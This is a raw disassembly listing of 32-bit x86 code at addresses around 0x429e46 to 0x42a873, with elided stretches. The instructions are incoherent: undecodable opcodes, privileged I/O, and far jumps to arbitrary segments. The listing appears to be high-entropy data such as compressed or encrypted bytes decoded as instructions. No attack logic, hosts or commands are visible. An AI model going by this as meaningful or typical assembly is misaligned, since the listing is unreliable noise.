  429e46:	aam    0x5a
  429e48:	aad    0x2f
  429e4a:	into   
  429e4b:	(bad)  
  429e4c:	ss mov dl,0x3b
  429e4f:	sti    
  429e50:	pop    ecx
  429e51:	inc    ebp
  429e52:	stc    
  429e53:	xchg   BYTE PTR ds:0xfc2889a5,dh
  429e59:	jnp    0x429e8f
  429e5b:	pop    ds
  429e5c:	sbb    eax,0x2544b154
  429e61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429e62:	xor    eax,0x828c99b1
  429e67:	aad    0x50
  429e69:	lods   eax,DWORD PTR ds:[esi]
  429e6a:	in     al,dx
  429e6b:	call   0x8ae9:0x5a0f90df
  429e72:	nop
  429e73:	mov    bh,0x4b
  429e75:	in     eax,0xf2
  429e77:	sti    
  429e78:	mov    dl,0x2f
  429e7a:	arpl   WORD PTR [edx],bx
  429e7c:	xchg   esi,eax
  429e7d:	push   0xffffffdf
  429e7f:	stc    
  429e80:	pop    esp
  429e81:	sbb    cl,BYTE PTR [ecx-0x6d]
  429e84:	mov    bh,0x7
  429e86:	enter  0x183a,0x95
  429e8a:	rol    BYTE PTR [esi+0x75],cl
  429e8d:	bound  esp,QWORD PTR [ebp+0x232848d4]
  429e93:	imul   edi,eax,0xffffffd0
  429e96:	cmp    ebp,DWORD PTR [ebp-0x5fe6c53]
  429e9c:	xor    al,0x55
  429e9e:	mov    ebp,0x42d89ea3
  429ea3:	js     0x429eb4
  429ea5:	adc    eax,0x2b901681
  429eaa:	pop    esp
  429eab:	xor    eax,0x81ceff40
  429eb0:	(bad)  
  429eb1:	sub    al,0xab
  429eb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429eb4:	push   ebx
	...
  429f15:	add    BYTE PTR [ecx],dh
  429f17:	inc    ebp
  429f18:	enter  0xfc06,0x8f
  429f1c:	push   DWORD PTR [edi+0x54]
  429f1f:	into   
  429f20:	fnstcw WORD PTR ds:0xd4aa9c91
  429f26:	pop    edx
  429f27:	rol    BYTE PTR [ecx],0x0
  429f2a:	pop    es
  429f2b:	add    DWORD PTR [eax],eax
  429f2d:	add    BYTE PTR [edx],dh
  429f2f:	mov    DWORD PTR [ebx+0x7f2a4858],esi
  429f35:	call   0xe9fa:0x44c29eea
  429f3c:	dec    eax
  429f3d:	js     0x429ec2
  429f3f:	das    
  429f40:	mov    esi,0x6ec57a1f
  429f45:	repz cmp al,0xe7
  429f48:	or     DWORD PTR [ecx],0x2206749e
  429f4e:	inc    esi
  429f4f:	jmp    0xed25:0x10006ec6
  429f56:	out    0x25,eax
  429f58:	mov    cl,0x2e
  429f5a:	jmp    0x71a1:0x64b9f366
  429f61:	jbe    0x429ef6
  429f63:	fisttp DWORD PTR [edx]
  429f65:	cdq    
  429f66:	mov    ah,BYTE PTR [ebp-0x566e0ff2]
  429f6c:	sbb    al,0x31
  429f6e:	shr    DWORD PTR [esi-0xf],1
  429f71:	sbb    al,0x9c
  429f73:	adc    al,0x58
  429f75:	daa    
  429f76:	inc    edi
  429f77:	sbb    eax,0xb6b1c10a
  429f7c:	out    dx,al
  429f7d:	xlat   BYTE PTR ds:[ebx]
  429f7e:	mov    BYTE PTR [ecx-0x48e985b8],0xbb
  429f85:	add    dl,BYTE PTR [edi-0x2613444b]
  429f8b:	out    dx,al
  429f8c:	mov    ebp,0x775ee90
  429f91:	jo     0x429f49
  429f93:	mov    ah,0xfb
  429f95:	sbb    ah,BYTE PTR [ebp+0x1b]
  429f98:	inc    esi
  429f99:	push   ebp
  429f9a:	pusha  
  429f9b:	in     eax,dx
  429f9c:	mov    eax,ds:0x930586cd
  429fa1:	mov    edx,0x48d3d163
  429fa6:	in     al,dx
  429fa7:	dec    esp
  429fa8:	pop    ebp
  429fa9:	ds jmp 0x557d:0x182c8182
  429fb1:	sar    DWORD PTR [esi],1
  429fb3:	push   cs
  429fb4:	adc    eax,0xd4b1ebdd
  429fb9:	das    
  429fba:	sti    
  429fbb:	imul   edx,eax,0xffffffee
  429fbe:	xlat   BYTE PTR ds:[ebx]
  429fbf:	and    cl,BYTE PTR [eax]
  429fc1:	out    0x33,al
  429fc3:	(bad)  
  429fc4:	xor    ebx,DWORD PTR [edx-0x101f91c8]
  429fca:	or     esi,DWORD PTR [ebp+0x6f43f44d]
  429fd0:	mov    WORD PTR [edi+0x49ff944c],fs
  429fd6:	sub    DWORD PTR ds:0x85189bc2,ecx
  429fdc:	repz and eax,0xd62b67a5
  429fe2:	test   bh,ch
  429fe4:	rol    ecx,cl
  429fe6:	adc    al,0x9f
  429fe8:	cmp    al,0xc1
  429fea:	popa   
  429feb:	mov    esp,DWORD PTR [ebx-0x5]
  429fee:	mov    al,0xf9
  429ff0:	test   BYTE PTR [edi+eiz*1-0x5c88e79f],ch
  429ff7:	inc    eax
  429ff8:	push   eax
  429ff9:	out    0x9d,al
  429ffb:	hlt    
  429ffc:	dec    esp
  429ffd:	inc    ebx
  429ffe:	fcomp  st(6)
  42a000:	pop    ecx
  42a001:	sti    
  42a002:	int3   
  42a003:	mov    esp,DWORD PTR [ecx-0x64b84f04]
  42a009:	add    al,BYTE PTR [edi]
  42a00b:	stos   BYTE PTR es:[edi],al
  42a00c:	cwde   
  42a00d:	(bad)  
  42a00e:	rcl    DWORD PTR [edx-0x29],1
  42a011:	mov    bh,0x76
  42a013:	xor    ch,BYTE PTR [ecx-0x5b466474]
  42a019:	add    DWORD PTR [edi+0x1f9424be],0xffffffc6
  42a020:	jmp    0x42a083
  42a022:	jle    0x429fe2
  42a024:	xchg   cl,cl
  42a026:	pop    ebx
  42a027:	xchg   esi,eax
  42a028:	fst    QWORD PTR [esi-0x28b51270]
  42a02e:	lods   al,BYTE PTR ds:[esi]
  42a02f:	pop    ebx
  42a030:	mov    edi,0x8c16761a
	...
  42a095:	add    bh,dl
  42a097:	pushf  
  42a098:	shr    BYTE PTR [ebp-0x1000235],0x30
  42a09f:	xchg   esi,eax
  42a0a0:	mov    esi,0x8e0894e
  42a0a5:	cmp    eax,0x1c161
  42a0aa:	pop    es
  42a0ab:	add    DWORD PTR [eax],eax
  42a0ad:	add    cl,ch
  42a0af:	rcr    BYTE PTR [eax+0x5d0fd66f],1
  42a0b5:	fscale 
  42a0b7:	mov    al,0xdd
  42a0b9:	call   DWORD PTR [esi+edi*1+0x6a085f05]
  42a0c0:	xchg   edi,eax
  42a0c1:	sbb    al,0x17
  42a0c3:	adc    al,al
  42a0c5:	and    ebx,ecx
  42a0c7:	in     eax,0xbc
  42a0c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a0ca:	int3   
  42a0cb:	mov    eax,0xfce1b69a
  42a0d0:	outs   dx,BYTE PTR ds:[esi]
  42a0d1:	in     eax,dx
  42a0d2:	retf   
  42a0d3:	jb     0x42a0cf
  42a0d5:	push   eax
  42a0d6:	sti    
  42a0d7:	imul   esi,DWORD PTR [ebp+0x5c],0x6e
  42a0db:	test   BYTE PTR [ebx],ah
  42a0dd:	icebp  
  42a0de:	int3   
  42a0df:	xchg   ecx,eax
  42a0e0:	scas   al,BYTE PTR es:[edi]
  42a0e1:	cld    
  42a0e2:	xchg   BYTE PTR [ebx],cl
  42a0e4:	lods   eax,DWORD PTR ds:[esi]
  42a0e5:	dec    ebp
  42a0e6:	aas    
  42a0e7:	push   0x116ebdd8
  42a0ec:	rcl    DWORD PTR [ebp-0x2c9d8779],1
  42a0f2:	sub    edx,ecx
  42a0f4:	mov    bx,0x3bb4
  42a0f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a0f9:	xchg   esp,eax
  42a0fa:	sti    
  42a0fb:	and    edi,DWORD PTR ds:0xea72a8ce
  42a101:	jbe    0x42a158
  42a103:	mov    edx,ebp
  42a105:	in     al,0xd5
  42a107:	enter  0x915b,0x7
  42a10b:	pop    eax
  42a10c:	fisubr WORD PTR [edi]
  42a10e:	out    0x2c,eax
  42a110:	int3   
  42a111:	xor    BYTE PTR [eax-0x2f],al
  42a114:	jb     0x42a0c3
  42a116:	sbb    DWORD PTR [ecx],0xb2f2b3d
  42a11c:	loop   0x42a129
  42a11e:	aam    0x26
  42a120:	test   al,0x9e
  42a122:	mov    dh,BYTE PTR [ebp-0x24]
  42a125:	fscale 
  42a127:	retf   
  42a128:	sub    BYTE PTR [edx+0x555bef24],0xfa
  42a12f:	cwde   
  42a130:	not    DWORD PTR [ebp+0x5f]
  42a133:	push   0x6905ee13
  42a138:	sub    bl,0x31
  42a13b:	ror    BYTE PTR [edi],cl
  42a13d:	or     ah,ch
  42a13f:	sbb    ah,BYTE PTR [ecx-0x779dc152]
  42a145:	repz adc al,0x0
  42a148:	int    0xe8
  42a14a:	into   
  42a14b:	mov    al,ds:0xcb660eca
  42a150:	gs jg  0x42a140
  42a153:	icebp  
  42a154:	data16 mov ah,0x39
  42a157:	sar    DWORD PTR [ebx+0x4beaf49f],1
  42a15d:	jl     0x42a117
  42a15f:	loop   0x42a11c
  42a161:	mov    al,0x4
  42a163:	neg    DWORD PTR [edi-0x7cc05014]
  42a169:	in     al,0xba
  42a16b:	adc    eax,0x7b722511
  42a170:	hlt    
  42a171:	add    DWORD PTR ds:0xc9bf9773,esp
  42a178:	mov    dh,0x1d
  42a17a:	jne    0x42a1be
  42a17c:	dec    ah
  42a17e:	ret    0xed55
  42a181:	ret    
  42a182:	inc    ebx
  42a183:	or     edx,DWORD PTR [ecx+0x77d702b6]
  42a189:	xlat   BYTE PTR ds:[ebx]
  42a18a:	pusha  
  42a18b:	in     eax,0x9b
  42a18d:	popf   
  42a18e:	fmul   QWORD PTR [ebp-0x5b]
  42a191:	xlat   BYTE PTR ds:[ebx]
  42a192:	popa   
  42a193:	mov    eax,0x6fe8f002
  42a198:	in     eax,0xd4
  42a19a:	xor    eax,0x509475e7
  42a19f:	out    0xb2,eax
  42a1a1:	pop    ss
  42a1a2:	or     BYTE PTR [ebx+0x4f],0xd8
  42a1a6:	sbb    BYTE PTR [edx+0x27],dh
  42a1a9:	lock push 0x3bbc6ca3
  42a1af:	icebp  
  42a1b0:	sbb    esi,DWORD PTR [ebp-0x17]
  42a1b3:	inc    esp
  42a1b4:	add    DWORD PTR [eax],eax
	...
  42a216:	sub    eax,DWORD PTR [ebp+0x19bf1995]
  42a21c:	scas   eax,DWORD PTR es:[edi]
  42a21d:	mov    bh,0x15
  42a21f:	fucomip st,st(5)
  42a221:	imul   ecx,esp,0x6814cba0
  42a227:	ret    0x1
  42a22a:	pop    es
  42a22b:	add    DWORD PTR [eax],eax
  42a22d:	add    BYTE PTR [ecx-0x31],ch
  42a230:	call   0xe524f1c
  42a235:	sub    cl,BYTE PTR [ecx+0x20901db8]
  42a23b:	cmc    
  42a23c:	jmp    0x51d1:0xae52bf1e
  42a243:	shr    ebx,1
  42a245:	jae    0x42a1d7
  42a247:	fs adc al,0xe2
  42a24a:	push   cs
  42a24b:	aaa    
  42a24c:	and    eax,0xc1e14388
  42a251:	cld    
  42a252:	bound  ecx,QWORD PTR [edx-0x74]
  42a255:	or     al,0xc9
  42a257:	cmp    DWORD PTR [esi],0xffffffe4
  42a25a:	int    0x44
  42a25c:	adc    BYTE PTR [edx-0x3f00efac],ah
  42a262:	or     ah,BYTE PTR [eax]
  42a264:	scas   al,BYTE PTR es:[edi]
  42a265:	and    dh,bh
  42a267:	mov    eax,ds:0xc743b9e5
  42a26c:	test   bh,0x5d
  42a26f:	imul   ecx,edx,0x47
  42a272:	in     eax,dx
  42a273:	(bad)  
  42a274:	popf   
  42a275:	pushf  
  42a276:	and    al,BYTE PTR ds:0x42971de4
  42a27c:	jp     0x42a234
  42a27e:	ja     0x42a243
  42a280:	inc    ebp
  42a281:	mov    bl,0x8a
  42a283:	ss test eax,0xf8ba6a03
  42a289:	retf   0x8411
  42a28c:	int3   
  42a28d:	ror    DWORD PTR [esi+0x77eae5c7],cl
  42a293:	pusha  
  42a294:	pop    edi
  42a295:	pop    edx
  42a296:	push   ebp
  42a297:	mov    ebx,0x963ea77
  42a29c:	aaa    
  42a29d:	sbb    al,BYTE PTR [edx-0x351eda83]
  42a2a3:	in     eax,dx
  42a2a4:	inc    ebp
  42a2a5:	jbe    0x42a2ff
  42a2a7:	adc    al,0xee
  42a2a9:	(bad)  
  42a2ab:	xchg   edi,eax
  42a2ac:	add    ch,ch
  42a2ae:	mov    bl,BYTE PTR [edx+0x3f]
  42a2b1:	sbb    eax,0x8a537b02
  42a2b6:	xchg   esi,eax
  42a2b7:	xchg   edx,eax
  42a2b8:	daa    
  42a2b9:	xchg   edx,eax
  42a2ba:	mov    dl,0x8a
  42a2bc:	sbb    BYTE PTR [edi+0x6],al
  42a2bf:	or     DWORD PTR [eax-0x11844e14],eax
  42a2c5:	(bad)
  42a2c9:	add    DWORD PTR [edi],esp
  42a2cb:	mov    bh,0xfd
  42a2cd:	dec    ecx
  42a2ce:	sub    eax,0xb074ed60
  42a2d3:	jo     0x42a2a3
  42a2d5:	fst    DWORD PTR [edi+0x2bbe0610]
  42a2db:	pop    ss
  42a2dc:	repz jecxz 0x42a2a4
  42a2df:	aas    
  42a2e0:	dec    ebp
  42a2e1:	call   0xcd5d:0x1f4ef9bb
  42a2e8:	pop    eax
  42a2e9:	push   0x2bad8e51
  42a2ee:	jnp    0x42a29a
  42a2f0:	call   0x9792acef
  42a2f5:	push   ds
  42a2f6:	loope  0x42a360
  42a2f8:	ds call 0x30c333cf
  42a2fe:	outs   dx,BYTE PTR ds:[esi]
  42a2ff:	adc    dl,BYTE PTR [edi+0x2f]
  42a302:	sbb    BYTE PTR [edx-0x49],al
  42a305:	lods   al,BYTE PTR ds:[esi]
  42a306:	gs dec ebx
  42a308:	inc    edx
  42a309:	or     ebp,DWORD PTR [ebp+0x2a36c7ab]
  42a30f:	int    0x8e
  42a311:	not    DWORD PTR [ebx]
  42a313:	mov    ecx,0x4d4c0853
  42a318:	dec    esp
  42a319:	mov    bl,0xb6
  42a31b:	or     BYTE PTR [edx+ebx*2+0xf4e327d],bh
  42a322:	xor    BYTE PTR [ecx-0x68a1ee98],dl
  42a328:	cld    
  42a329:	rol    DWORD PTR [edx],0xbe
  42a32c:	sahf   
  42a32d:	inc    edi
  42a32e:	jnp    0x42a352
  42a330:	dec    ebp
  42a331:	cwde   
  42a332:	scas   al,BYTE PTR es:[edi]
  42a333:	adc    ecx,DWORD PTR [esi+0x0]
	...
  42a395:	add    BYTE PTR [edi+0xe],bh
  42a398:	jne    0x42a3d5
  42a39a:	jne    0x42a417
  42a39c:	jg     0x42a3ec
  42a39e:	ds loop 0x42a3ca
  42a3a1:	retf   0xf866
  42a3a4:	or     BYTE PTR gs:[edi-0x3d],ch
  42a3a8:	add    DWORD PTR [eax],eax
  42a3aa:	pop    es
  42a3ab:	add    DWORD PTR [eax],eax
  42a3ad:	add    BYTE PTR [esi-0x5],ch
  42a3b0:	(bad)  
  42a3b1:	(bad)  
  42a3b2:	sti    
  42a3b3:	adc    eax,0xbf151cdc
  42a3b8:	cwde   
  42a3b9:	jg     0x42a42d
  42a3bb:	jno    0x42a386
  42a3bd:	xchg   ebx,eax
  42a3be:	or     eax,0x48bfd64d
  42a3c3:	(bad)  
  42a3c4:	mov    dh,0x60
  42a3c6:	pop    esp
  42a3c7:	test   DWORD PTR [ebp-0x6f49501],edi
  42a3cd:	jb     0x42a36c
  42a3cf:	nop
  42a3d0:	fiadd  WORD PTR [eax]
  42a3d2:	daa    
  42a3d3:	dec    ebp
  42a3d4:	mov    WORD PTR [ebp-0x7768c4f3],cs
  42a3da:	sbb    ebp,ecx
  42a3dc:	enter  0xedb6,0x6e
  42a3e0:	inc    edx
  42a3e1:	mov    ecx,0x8aa51591
  42a3e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a3e7:	cld    
  42a3e8:	repz mov edi,0xcdc705ec
  42a3ee:	xchg   ecx,eax
  42a3ef:	std    
  42a3f0:	clc    
  42a3f1:	inc    esi
  42a3f2:	xchg   edi,eax
  42a3f3:	xor    ch,0xab
  42a3f6:	push   0x958ec8e4
  42a3fb:	and    DWORD PTR [ebx-0x455cc66d],edx
  42a401:	adc    DWORD PTR [eax+edi*4+0x32733579],0x554338d3
  42a40c:	loope  0x42a3a4
  42a40e:	pop    ebx
  42a40f:	cmp    eax,0x79ecc0b5
  42a414:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a415:	aad    0xff
  42a417:	jle    0x42a400
  42a419:	jnp    0x42a3cf
  42a41b:	add    DWORD PTR [ebx],ecx
  42a41d:	je     0x42a469
  42a41f:	sub    eax,0x80f36321
  42a424:	jmp    0x8b09:0x91dfb388
  42a42b:	adc    al,0xa2
  42a42d:	jl     0x42a41e
  42a42f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a430:	inc    esi
  42a431:	sub    dh,BYTE PTR [ebp+0x6f885681]
  42a437:	push   cs
  42a438:	pop    esi
  42a439:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a43a:	ins    BYTE PTR es:[edi],dx
  42a43b:	adc    BYTE PTR [edi],bl
  42a43d:	cs enter 0x7c5d,0x3
  42a442:	pop    ebx
  42a443:	dec    eax
  42a444:	xor    BYTE PTR [ecx-0x2a],ah
  42a447:	jo     0x42a43e
  42a449:	mov    eax,ds:0x40fb0cdd
  42a44e:	push   cs
  42a44f:	jne    0x42a415
  42a451:	retf   
  42a452:	or     eax,0x9ccd6ede
  42a457:	xchg   ebx,eax
  42a458:	out    dx,al
  42a459:	lea    edx,[eax-0x33]
  42a45c:	pop    ebp
  42a45d:	hlt    
  42a45e:	xchg   ebx,eax
  42a45f:	pop    ss
  42a460:	jmp    0xc558:0xab008a
  42a467:	dec    ebp
  42a468:	dec    edx
  42a469:	jno    0x42a493
  42a46b:	add    ch,dl
  42a46d:	jo     0x42a48b
  42a46f:	aas    
  42a470:	adc    esp,ebp
  42a472:	jmp    0x88bf:0xcd4f380c
  42a479:	push   ecx
  42a47a:	mov    WORD PTR [esi-0x6b],ss
  42a47d:	mov    ds:0xc7821f45,al
  42a482:	mov    esp,0x3386711
  42a487:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a488:	xor    ebp,edi
  42a48a:	ror    BYTE PTR [edi+0x5d],cl
  42a48d:	ror    DWORD PTR [edi-0x34],cl
  42a490:	clc    
  42a491:	les    esp,FWORD PTR [ebx-0x44ed30ca]
  42a497:	addr16 test dl,0x1b
  42a49b:	pop    ds
  42a49c:	and    dl,ah
  42a49e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a49f:	gs mov ch,0x2a
  42a4a2:	ss leave 
  42a4a4:	push   eax
  42a4a5:	cli    
  42a4a6:	push   edi
  42a4a7:	cwde   
  42a4a8:	fcomp  QWORD PTR ds:0x405a64fa
  42a4ae:	fimul  WORD PTR [ecx]
  42a4b0:	in     al,dx
  42a4b1:	shr    DWORD PTR [edi+0x4dc3],0x0
	...
  42a514:	add    BYTE PTR [eax],al
  42a516:	sbb    BYTE PTR [edi+0x17],cl
  42a519:	mov    ecx,0xefbef957
  42a51e:	mov    cl,0xd7
  42a520:	dec    ebp
  42a521:	add    bl,BYTE PTR [ebx]
  42a523:	push   esp
  42a524:	scas   al,BYTE PTR es:[edi]
  42a525:	jge    0x42a59d
  42a527:	les    eax,FWORD PTR [ecx]
  42a529:	add    BYTE PTR [edi],al
  42a52b:	add    DWORD PTR [eax],eax
  42a52d:	add    BYTE PTR [ebp+0x48],al
  42a530:	loopne 0x42a532
  42a532:	lods   al,BYTE PTR ds:[esi]
  42a533:	push   eax
  42a534:	out    dx,al
  42a535:	jnp    0x42a4df
  42a537:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a538:	adc    BYTE PTR [edi-0x57],ch
  42a53b:	sbb    BYTE PTR [edx],bh
  42a53d:	xchg   ecx,eax
  42a53e:	add    DWORD PTR [ecx-0x75],esi
  42a541:	out    0xff,eax
  42a543:	add    al,dl
  42a545:	rol    BYTE PTR [eax],1
  42a547:	mov    dh,BYTE PTR [edi-0x5]
  42a54a:	sbb    eax,0x1ddf29a0
  42a54f:	add    ecx,DWORD PTR [esi+ecx*2]
  42a552:	sahf   
  42a553:	hlt    
  42a554:	fcomp  QWORD PTR [ecx-0x79505fa]
  42a55a:	jg     0x42a590
  42a55c:	inc    ebp
  42a55d:	shl    BYTE PTR [esi+0x52b3b308],cl
  42a563:	cmp    ch,BYTE PTR [ecx]
  42a565:	xchg   BYTE PTR [eax],cl
  42a567:	addr16 push 0x1d
  42a56a:	retf   
  42a56b:	sub    DWORD PTR [eax-0x55958502],ecx
  42a571:	sub    DWORD PTR [esi*4-0x2cfa9173],esi
  42a578:	dec    ecx
  42a579:	mov    cl,0x61
  42a57b:	fisttp WORD PTR [esi-0x7238be27]
  42a581:	(bad)  
  42a582:	in     eax,dx
  42a583:	and    eax,0x19212cb5
  42a588:	mov    eax,ds:0xf6e39693
  42a58d:	cmp    BYTE PTR [ebp-0x2b],al
  42a590:	xchg   edx,eax
  42a591:	sub    eax,edi
  42a593:	in     eax,0xb4
  42a595:	shl    DWORD PTR [edx+0x25],cl
  42a598:	outs   dx,BYTE PTR ds:[esi]
  42a599:	(bad)  
  42a59a:	mov    eax,ds:0x5f65f2c3
  42a59f:	sbb    al,BYTE PTR [ecx+0x75]
  42a5a2:	mov    bh,0x55
  42a5a4:	and    eax,0x9ad33146
  42a5a9:	repz cli 
  42a5ab:	sbb    esi,DWORD PTR [edx+0x3897a9e1]
  42a5b1:	add    BYTE PTR [esi],ah
  42a5b3:	aaa    
  42a5b4:	adc    BYTE PTR [ebp+ebp*4-0x36],bh
  42a5b8:	in     eax,0x80
  42a5ba:	cdq    
  42a5bb:	xchg   BYTE PTR [edi],ah
  42a5bd:	add    BYTE PTR [ecx],cl
  42a5bf:	inc    edx
  42a5c0:	xor    ebp,ebx
  42a5c2:	into   
  42a5c3:	stos   DWORD PTR es:[edi],eax
  42a5c4:	pusha  
  42a5c5:	sti    
  42a5c6:	les    edi,FWORD PTR [edi]
  42a5c8:	mov    esp,0xfa509d75
  42a5cd:	outs   dx,DWORD PTR ds:[esi]
  42a5ce:	gs or  al,0x30
  42a5d1:	(bad)  
  42a5d2:	cs sti 
  42a5d4:	inc    ebx
  42a5d5:	cmp    edx,edi
  42a5d7:	jns    0x42a5d0
  42a5d9:	outs   dx,BYTE PTR ds:[esi]
  42a5da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a5db:	jb     0x42a565
  42a5dd:	das    
  42a5de:	xchg   ebx,eax
  42a5df:	out    dx,eax
  42a5e0:	call   0xe254868d
  42a5e5:	sub    dl,BYTE PTR [edi-0x369fdd9b]
  42a5eb:	mov    edx,0x58788bc
  42a5f0:	leave  
  42a5f1:	inc    esi
  42a5f2:	mov    bh,0xbb
  42a5f4:	xor    edi,DWORD PTR [eax-0x52360978]
  42a5fa:	xchg   ebp,ecx
  42a5fc:	out    0x4c,al
  42a5fe:	push   edx
  42a5ff:	xor    BYTE PTR [eax-0x60728f1e],ah
  42a605:	mov    eax,ds:0x43d172b2
  42a60a:	arpl   WORD PTR [edi+0x22b6fdc2],ax
  42a610:	fld    TBYTE PTR [eax+0x63]
  42a613:	mov    eax,ds:0xb3b5bf2d
  42a618:	mov    al,ds:0xc4a3ac23
  42a61d:	gs cmp eax,0xf053e3d
  42a623:	enter  0xc61b,0x3d
  42a627:	add    al,0xf0
  42a629:	int3   
  42a62a:	daa    
  42a62b:	imul   ebp,DWORD PTR [esi-0x6beb8bed],0xfffffff2
  42a632:	push   esi
  42a633:	scas   al,BYTE PTR es:[edi]
  42a634:	mov    edx,0x0
	...
  42a695:	add    BYTE PTR [esi+edx*1],ah
  42a698:	outs   dx,BYTE PTR ds:[esi]
  42a699:	(bad)  
  42a69a:	jle    0x42a69b
  42a69c:	lods   eax,DWORD PTR ds:[esi]
  42a69d:	test   DWORD PTR [edi],0x5c67323b
  42a6a3:	push   cs
  42a6a4:	mov    dl,BYTE PTR [ecx+0x1c57d]
  42a6aa:	pop    es
  42a6ab:	add    DWORD PTR [eax],eax
  42a6ad:	add    BYTE PTR [esi+ecx*4],dh
  42a6b0:	sub    edx,DWORD PTR [ecx]
  42a6b2:	call   0xc0a0:0x320c18d8
  42a6b9:	jle    0x42a69a
  42a6bb:	push   esi
  42a6bc:	push   ds
  42a6bd:	xchg   esi,eax
  42a6be:	dec    esi
  42a6bf:	pusha  
  42a6c0:	dec    edx
  42a6c1:	or     BYTE PTR [esi+0x1b],bh
  42a6c4:	jnp    0x42a683
  42a6c6:	inc    cx
  42a6c8:	js     0x42a6af
  42a6ca:	ins    DWORD PTR es:[edi],dx
  42a6cb:	fs cdq 
  42a6cd:	int    0x6d
  42a6cf:	mov    cl,0x24
  42a6d1:	in     al,dx
  42a6d2:	jns    0x42a675
  42a6d4:	fld    DWORD PTR [eax+0x29]
  42a6d7:	push   0x3
  42a6d9:	dec    esi
  42a6da:	hlt    
  42a6db:	fld    TBYTE PTR [edx-0x191d8c2e]
  42a6e1:	(bad)  
  42a6e2:	(bad)  
  42a6e4:	aam    0xc3
  42a6e6:	cld    
  42a6e7:	ins    DWORD PTR es:[edi],dx
  42a6e8:	add    ch,BYTE PTR [edi+0x72]
  42a6eb:	cmc    
  42a6ec:	pop    esi
  42a6ed:	mov    ebx,0x13d787fb
  42a6f2:	jb     0x42a6d6
  42a6f4:	stc    
  42a6f5:	push   esi
  42a6f6:	dec    ebp
  42a6f7:	dec    esi
  42a6f8:	dec    ebp
  42a6f9:	sbb    esp,DWORD PTR [ecx]
  42a6fb:	cs mov ebx,0xd59f5626
  42a701:	addr16 cwde 
  42a703:	int    0x58
  42a705:	cmp    DWORD PTR [eax-0x34],0x1
  42a709:	add    BYTE PTR [ebx-0x5e28fb84],bh
  42a70f:	mov    DWORD PTR [ecx-0x1f880b9e],esp
  42a715:	not    DWORD PTR [ebx+0x6e7d904]
  42a71b:	or     dl,BYTE PTR [ecx+0x57c8d3ee]
  42a721:	into   
  42a722:	push   esp
  42a723:	retf   
  42a724:	sbb    eax,DWORD PTR [esi-0x1d68cd57]
  42a72a:	push   ebx
  42a72b:	(bad)  
  42a72c:	fistp  WORD PTR [eax-0x20]
  42a72f:	icebp  
  42a730:	jle    0x42a733
  42a732:	stos   BYTE PTR es:[edi],al
  42a733:	das    
  42a734:	popf   
  42a735:	out    0x1e,al
  42a737:	add    eax,DWORD PTR [esi]
  42a739:	je     0x42a700
  42a73b:	push   ebp
  42a73c:	jno    0x42a6be
  42a73e:	cld    
  42a73f:	fstp   DWORD PTR [ecx-0x3b5f8f2f]
  42a745:	dec    edx
  42a746:	lock cmc 
  42a748:	mov    DWORD PTR [edx],esi
  42a74a:	pop    ds
  42a74b:	bnd ja 0x42a73e
  42a74e:	push   esi
  42a74f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a750:	not    ch
  42a752:	dec    eax
  42a753:	jmp    0x42a758
  42a755:	inc    ebx
  42a756:	int3   
  42a757:	and    ecx,esi
  42a759:	imul   edx,DWORD PTR [edi+0x166f6b40],0x18
  42a760:	(bad)  
  42a761:	popf   
  42a762:	jb     0x42a788
  42a764:	mov    ds:0x9719488e,al
  42a769:	int    0xba
  42a76b:	or     al,0xf3
  42a76d:	or     dl,cl
  42a76f:	sahf   
  42a770:	push   cs
  42a771:	(bad)  
  42a772:	js     0x42a761
  42a774:	mov    edi,0x82b56bd
  42a779:	out    0xa2,al
  42a77b:	call   0x7359:0xc4a75a26
  42a782:	mov    es,WORD PTR [esi+0x7d9344dc]
  42a788:	mov    WORD PTR [ebp+0x4a],cs
  42a78b:	(bad)  
  42a78c:	push   edx
  42a78d:	aam    0x38
  42a78f:	and    eax,0x573c40ea
  42a794:	dec    esi
  42a796:	sub    eax,0x7ff360dd
  42a79b:	xor    eax,0x3655d74e
  42a7a0:	mov    ch,0x5e
  42a7a2:	sub    al,0x22
  42a7a4:	xchg   ebp,eax
  42a7a5:	mov    BYTE PTR [ebp+0x22],0x3b
  42a7a9:	push   0x2570f1ca
  42a7ae:	hlt    
  42a7af:	mov    esi,0x25114497
  42a7b4:	pushf  
	...
  42a815:	add    BYTE PTR [edx-0x10409c9b],cl
  42a81b:	mov    edi,0x497a75de
  42a820:	arpl   WORD PTR [ebx],sp
  42a822:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a823:	cmp    BYTE PTR [edi-0x7c],dh
  42a826:	test   dh,al
  42a828:	add    DWORD PTR [eax],eax
  42a82a:	pop    es
  42a82b:	add    DWORD PTR [eax],eax
  42a82d:	add    BYTE PTR [edi-0x1b08aff],cl
  42a833:	push   ds
  42a834:	loop   0x42a89b
  42a836:	in     al,0x3
  42a838:	leave  
  42a839:	clc    
  42a83a:	std    
  42a83b:	in     al,dx
  42a83c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a83d:	inc    edi
  42a83e:	mov    eax,ds:0x592f4325
  42a843:	sub    eax,0xabdb842e
  42a848:	psubb  mm1,QWORD PTR [eax+0x35]
  42a84c:	push   0xcdb51ac0
  42a851:	gs dec ebx
  42a853:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a854:	push   eax
  42a855:	idiv   BYTE PTR [eax]
  42a857:	je     0x42a7ec
  42a859:	scas   eax,DWORD PTR es:[edi]
  42a85a:	add    eax,0x2248b65b
  42a85f:	cdq    
  42a860:	pop    ecx
  42a861:	std    
  42a862:	mov    edx,0xfd664c57
  42a867:	jmp    0x5dd80aa8
  42a86c:	(bad)  
  42a86d:	das    
  42a86e:	xchg   ecx,eax
  42a86f:	sbb    DWORD PTR [eax+ebp*1+0x76],ebp
  42a873:	test   dl,al
